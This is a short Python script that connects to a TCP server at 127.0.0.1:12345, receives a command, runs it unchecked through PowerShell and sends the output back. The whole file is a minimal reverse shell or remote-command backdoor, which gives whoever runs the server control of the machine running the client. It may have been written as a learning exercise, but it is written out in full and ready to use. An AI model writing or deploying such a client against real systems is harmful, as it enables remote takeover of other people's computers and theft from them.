import socket
import subprocess

#command = "Get-Process | Where-Object { $_.CPU -gt 10 }"
def run_powershell_command(command):
    # Run the PowerShell command
    process = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Get the standard output and standard error
    stdout, stderr = process.communicate()

    # Combine both outputs into a single string
    result = f"Output:\n{stdout}\nError:\n{stderr}"

    return result

def main():
    # Server address and port
    host = '127.0.0.1'
    port = 12345

    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        client_socket.connect((host, port))

        # Receive the response from the server
        cmnd = client_socket.recv(1024)

        out = run_powershell_command(cmnd)

        client_socket.sendall(out.encode('utf-8'))

    except Exception as e:
        print("An error occurred:", str(e))

    finally:
        # Close the connection
        client_socket.close()

if __name__ == "__main__":
    main()